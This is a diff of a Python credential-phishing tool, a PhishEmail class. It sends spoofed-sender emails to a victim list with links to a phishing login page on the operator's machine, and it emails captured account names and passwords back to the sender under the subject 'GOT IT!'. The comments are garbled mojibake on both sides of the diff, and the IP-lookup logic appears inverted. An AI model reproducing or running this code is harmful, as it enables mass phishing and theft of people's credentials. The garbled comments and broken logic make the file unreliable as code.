@@ -5,7 +5,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 import socket
 
-#¸ºÔğ·¢ËÍµöÓãÓÊ¼ş
+#è´Ÿè´£å‘é€é’“é±¼é‚®ä»¶
 class PhishEmail:
     __SENDER_REQUIRED_KEY = ['Host', 'Port', 'Email', 'Password']
     __sender = {}
@@ -20,7 +20,7 @@ class PhishEmail:
 
     def __init__(self, sender_data = None, victims_data = None, content_data = None):
         '''
-        ¹¹Ôìº¯Êı£¬ÉèÖÃ·¢ËÍ·½¡¢ÊÜº¦ÕßºÍÄÚÈİÊı¾İ¡£
+        æ„é€ å‡½æ•°ï¼Œè®¾ç½®å‘é€æ–¹ã€å—å®³è€…å’Œå†…å®¹æ•°æ®ã€‚
         '''
         if sender_data is not None:
             self.set_sender(sender_data)
@@ -31,10 +31,10 @@ class PhishEmail:
 
     def set_sender(self, data):
         '''
-        ÉèÖÃ·¢ËÍ·½Êı¾İ¡£
+        è®¾ç½®å‘é€æ–¹æ•°æ®ã€‚
 
-        ²ÎÊı£º
-        data (dict): ·¢ËÍ·½Êı¾İ
+        å‚æ•°ï¼š
+        data (dict): å‘é€æ–¹æ•°æ®
         '''
         if isinstance(data, dict) and all(key in self.__SENDER_REQUIRED_KEY for key in data):
             self.__sender = data
@@ -43,10 +43,10 @@ class PhishEmail:
 
     def set_victims(self, _data):
         '''
-        ÉèÖÃÊÜº¦ÕßÊı¾İ¡£
+        è®¾ç½®å—å®³è€…æ•°æ®ã€‚
 
-        ²ÎÊı£º
-        data (list): ÊÜº¦ÕßÊı¾İ
+        å‚æ•°ï¼š
+        data (list): å—å®³è€…æ•°æ®
         '''
         if isinstance(_data, list) and len(_data) > 0:
             self.__victims = _data
@@ -55,10 +55,10 @@ class PhishEmail:
 
     def set_content(self, _data):
         '''
-        ÉèÖÃÄÚÈİÊı¾İ¡£
+        è®¾ç½®å†…å®¹æ•°æ®ã€‚
 
-        ²ÎÊı£º
-        data (dict): ÄÚÈİÊı¾İ
+        å‚æ•°ï¼š
+        data (dict): å†…å®¹æ•°æ®
         '''
         if isinstance(_data, dict) and all(key in _data for key in self.__CONTENT_REQUIRED_KEY):
             self.__content = _data
@@ -67,13 +67,13 @@ class PhishEmail:
 
     def send(self, victim_number = -1):
         '''
-        ÏòÊÜº¦ÕßÓÊÏä·¢ËÍµöÓãÓÊ¼ş¡£
+        å‘å—å®³è€…é‚®ç®±å‘é€é’“é±¼é‚®ä»¶ã€‚
 
-        ²ÎÊı£º
-        victim_number (int): ÊÜº¦ÕßÊıÁ¿£¬Ä¬ÈÏÎª-1£¬±íÊ¾È«²¿ÊÜº¦Õß£¬·ñÔò±íÊ¾·¢ËÍµÄÊÜº¦ÕßÊıÁ¿£¬½«ÏòÊÜº¦ÕßÊı¾İµÄÇ°victim_number¸öÓÊÏä·¢ËÍÓÊ¼ş
+        å‚æ•°ï¼š
+        victim_number (int): å—å®³è€…æ•°é‡ï¼Œé»˜è®¤ä¸º-1ï¼Œè¡¨ç¤ºå…¨éƒ¨å—å®³è€…ï¼Œå¦åˆ™è¡¨ç¤ºå‘é€çš„å—å®³è€…æ•°é‡ï¼Œå°†å‘å—å®³è€…æ•°æ®çš„å‰victim_numberä¸ªé‚®ç®±å‘é€é‚®ä»¶
 
-        ·µ»Ø£º
-        list: ·¢ËÍ³É¹¦µÄÊÜº¦ÕßÓÊÏäÁĞ±í£¬·¢ËÍÊ§°ÜÔò·µ»ØNone
+        è¿”å›ï¼š
+        list: å‘é€æˆåŠŸçš„å—å®³è€…é‚®ç®±åˆ—è¡¨ï¼Œå‘é€å¤±è´¥åˆ™è¿”å›None
         '''
         if self.__sender_is_initialized and self.__victims_is_initialized and self.__content_is_initialized:
             return_list = [self.__sender['Email']]
@@ -105,11 +105,11 @@ class PhishEmail:
 
     def send_reply(self, account, password):
         '''
-        Ïò·¢ËÍÕß·¢ËÍ»Ø¸´£¬Èç¹ûÓĞÊÜº¦ÕßÍ¨¹ıµöÓãÓÊ¼ş½øÈëµöÓãÍøÕ¾£¬²¢ÇÒÊäÈëÁËÕË»§ÃÜÂë£¬ÔòÏò·¢ËÍÕßÓÊÏä·¢ËÍ±êÌâÎª¡°GOT IT!¡±µÄÓÊ¼ş£¬ÓÊ¼şÄÚ°üº¬µöµ½µÄÕË»§ÃÜÂë£¬µöÓã³É¹¦¡£
+        å‘å‘é€è€…å‘é€å›å¤ï¼Œå¦‚æœæœ‰å—å®³è€…é€šè¿‡é’“é±¼é‚®ä»¶è¿›å…¥é’“é±¼ç½‘ç«™ï¼Œå¹¶ä¸”è¾“å…¥äº†è´¦æˆ·å¯†ç ï¼Œåˆ™å‘å‘é€è€…é‚®ç®±å‘é€æ ‡é¢˜ä¸ºâ€œGOT IT!â€çš„é‚®ä»¶ï¼Œé‚®ä»¶å†…åŒ…å«é’“åˆ°çš„è´¦æˆ·å¯†ç ï¼Œé’“é±¼æˆåŠŸã€‚
 
-        ²ÎÊı£º
-        account (str): µöÓãµöµ½µÄÕËºÅ
-        password (str): µöÓãµöµ½µÄÃÜÂë
+        å‚æ•°ï¼š
+        account (str): é’“é±¼é’“åˆ°çš„è´¦å·
+        password (str): é’“é±¼é’“åˆ°çš„å¯†ç 
         '''
         if self.__sender_is_initialized and self.__victims_is_initialized and self.__content_is_initialized:
             server = self.__connect_server()
@@ -134,10 +134,10 @@ class PhishEmail:
 
     def __connect_server(self):
         '''
-        Á¬½ÓÓÊ¼ş·şÎñÆ÷¡£
+        è¿æ¥é‚®ä»¶æœåŠ¡å™¨ã€‚
 
-        ·µ»Ø£º
-        server (SMTP_SSL): Á¬½Ó³É¹¦·µ»Ø·şÎñÆ÷¶ÔÏó£¬·ñÔò·µ»ØNone¡£
+        è¿”å›ï¼š
+        server (SMTP_SSL): è¿æ¥æˆåŠŸè¿”å›æœåŠ¡å™¨å¯¹è±¡ï¼Œå¦åˆ™è¿”å›Noneã€‚
         '''
         try:
             server = smtplib.SMTP_SSL(self.__sender['Host'], self.__sender['Port'])
@@ -149,28 +149,28 @@ class PhishEmail:
 
     def __create_message(self, victim):
         '''
-        ´´½¨ÓÊ¼ş£¬¸ù¾İÄÚÈİÊı¾İ´´½¨²»Í¬ÀàĞÍµÄÓÊ¼ş¡£
+        åˆ›å»ºé‚®ä»¶ï¼Œæ ¹æ®å†…å®¹æ•°æ®åˆ›å»ºä¸åŒç±»å‹çš„é‚®ä»¶ã€‚
 
-        ²ÎÊı£º
-        victim (str): ÊÜº¦ÕßÓÊÏä
+        å‚æ•°ï¼š
+        victim (str): å—å®³è€…é‚®ç®±
 
-        ·µ»Ø£º
-        message (MIMEMultipart): ÓÊ¼ş£¬´´½¨Ê§°ÜÔò·µ»Ø¿Õ
+        è¿”å›ï¼š
+        message (MIMEMultipart): é‚®ä»¶ï¼Œåˆ›å»ºå¤±è´¥åˆ™è¿”å›ç©º
         '''
         try:
             message = MIMEMultipart()
-            message['From'] = f"{self.__content['Disguised Name']} <{self.__sender['Email']}>"  #Î±×°·¢ËÍÕßµÄÃû×Ö
+            message['From'] = f"{self.__content['Disguised Name']} <{self.__sender['Email']}>"  #ä¼ªè£…å‘é€è€…çš„åå­—
             message['To'] = victim
             message['Subject'] = self.__content['Subject']
 
-            if self.__content['Content Type'] == 'Only Text':   #Èç¹ûÊÇ´¿ÎÄ±¾£¬Ö±½ÓÌí¼ÓÎÄ±¾
+            if self.__content['Content Type'] == 'Only Text':   #å¦‚æœæ˜¯çº¯æ–‡æœ¬ï¼Œç›´æ¥æ·»åŠ æ–‡æœ¬
                 text = self.__content['Text']
                 message.attach(MIMEText(text, 'plain'))
-            elif self.__content['Content Type'] == 'URL':       #Èç¹ûÊÇURL£¬½«ÎÄ±¾ÖĞµÄ\tÌæ»»ÎªµöÓãÍøÕ¾Á´½Ó
+            elif self.__content['Content Type'] == 'URL':       #å¦‚æœæ˜¯URLï¼Œå°†æ–‡æœ¬ä¸­çš„\tæ›¿æ¢ä¸ºé’“é±¼ç½‘ç«™é“¾æ¥
                 ip = self.__get_ip()
                 text = self.__content['Text'].replace('\t', f"<a href='http://{ip}:5000/login' style='color:blue'>{self.__content['URL Text']}</a>").replace('\n', '<br>')
                 message.attach(MIMEText(text, 'html'))
-            elif self.__content['Content Type'] == 'HTML':      #Èç¹ûÊÇHTML£¬¶ÁÈ¡HTMLÎÄ¼şÄÚÈİ£¬½«PHISH WEBSITEÌæ»»ÎªµöÓãÍøÕ¾Á´½Ó
+            elif self.__content['Content Type'] == 'HTML':      #å¦‚æœæ˜¯HTMLï¼Œè¯»å–HTMLæ–‡ä»¶å†…å®¹ï¼Œå°†PHISH WEBSITEæ›¿æ¢ä¸ºé’“é±¼ç½‘ç«™é“¾æ¥
                 filepath = os.path.join('.', 'templates', self.__content['HTML Name'])
                 with open(filepath, 'r', encoding='utf-8') as file:
                     content = file.read()
@@ -187,15 +187,15 @@ class PhishEmail:
 
     def __send_message(self, target, message, server):
         '''
-        ·¢ËÍÓÊ¼ş¡£
+        å‘é€é‚®ä»¶ã€‚
 
-        ²ÎÊı£º
-        target (str): Ä¿±êÓÊÏä
-        message (MIMEMultipart): ÓÊ¼ş
-        server (SMTP_SSL): ·şÎñÆ÷
+        å‚æ•°ï¼š
+        target (str): ç›®æ ‡é‚®ç®±
+        message (MIMEMultipart): é‚®ä»¶
+        server (SMTP_SSL): æœåŠ¡å™¨
 
-        ·µ»Ø£º
-        bool: ·¢ËÍ³É¹¦·µ»ØTrue£¬·ñÔò·µ»ØFalse
+        è¿”å›ï¼š
+        bool: å‘é€æˆåŠŸè¿”å›Trueï¼Œå¦åˆ™è¿”å›False
         '''
         try:
             server.sendmail(self.__sender['Email'], target, message.as_string())
@@ -206,11 +206,11 @@ class PhishEmail:
 
     def __update_progress(self, current, maximum):
         '''
-        ÔÚ¿ØÖÆÌ¨ÏÔÊ¾²¢¸üĞÂ½ø¶ÈÌõ¡£
+        åœ¨æ§åˆ¶å°æ˜¾ç¤ºå¹¶æ›´æ–°è¿›åº¦æ¡ã€‚
 
-        ²ÎÊı£º
-        current (int): µ±Ç°½ø¶È
-        maximum (int): ×î´ó½ø¶È
+        å‚æ•°ï¼š
+        current (int): å½“å‰è¿›åº¦
+        maximum (int): æœ€å¤§è¿›åº¦
         '''
         current = current + 1
         progress = current / maximum
@@ -222,32 +222,32 @@ class PhishEmail:
 
     def __get_ip(self):
         '''
-        »ñÈ¡±¾»úip¡£
+        è·å–æœ¬æœºipã€‚
 
-        ·µ»Ø£º
-        str: ±¾»úip£¬»ñÈ¡Ê§°ÜÔò·µ»ØNone¡£
+        è¿”å›ï¼š
+        str: æœ¬æœºipï¼Œè·å–å¤±è´¥åˆ™è¿”å›Noneã€‚
         '''
         ip = None
         hostname = socket.gethostname()
         all_address_info = socket.getaddrinfo(hostname, None)
 
         #*********************************************************************************************************************
-        #Õâ¸ö·½·¨²»Ò»¶¨ÄÜ»ñÈ¡µ½ÕıÈ·µÄ±¾»úIPµØÖ·£¬Èç¹û»ñÈ¡µÄIPµØÖ·´íÎó£¬ĞèÒªÊÖ¶¯ĞŞ¸ÄÕâ¸öº¯Êı
-        #È¡Ïû×¢ÊÍ£¬Ö±½Ó·µ»ØÕıÈ·µÄIPµØÖ·×Ö·û´®
+        #è¿™ä¸ªæ–¹æ³•ä¸ä¸€å®šèƒ½è·å–åˆ°æ­£ç¡®çš„æœ¬æœºIPåœ°å€ï¼Œå¦‚æœè·å–çš„IPåœ°å€é”™è¯¯ï¼Œéœ€è¦æ‰‹åŠ¨ä¿®æ”¹è¿™ä¸ªå‡½æ•°
+        #å–æ¶ˆæ³¨é‡Šï¼Œç›´æ¥è¿”å›æ­£ç¡®çš„IPåœ°å€å­—ç¬¦ä¸²
         #This method may not get the correct local IP address, if you get the wrong IP address, you need to manually modify this function
         #Uncomment and return the correct IP address string
-        #ip = '192.168.1.7'
+        #ip = '192.168.1.1'
         #*********************************************************************************************************************
 
         if ip is not None:
-            #»ñÈ¡±¾»úËùÓĞipv4µØÖ·
+            #è·å–æœ¬æœºæ‰€æœ‰ipv4åœ°å€
             ip_list = []
             for address_info in all_address_info:
                 address = address_info[4][0]
                 if ':' not in address:
                     ip_list.append(address)
 
-            #±¾»ú¿ÉÄÜ´æÔÚ¶à¸öipv4µØÖ·£¬Ñ¡Ôñ×îĞ¡µØÖ·
+            #æœ¬æœºå¯èƒ½å­˜åœ¨å¤šä¸ªipv4åœ°å€ï¼Œé€‰æ‹©æœ€å°åœ°å€
             if len(ip_list) != 0:
                 ip_list.sort(key=lambda ip: (int(ip.split('.')[2]), int(ip.split('.')[3])))
                 ip = ip_list[0]
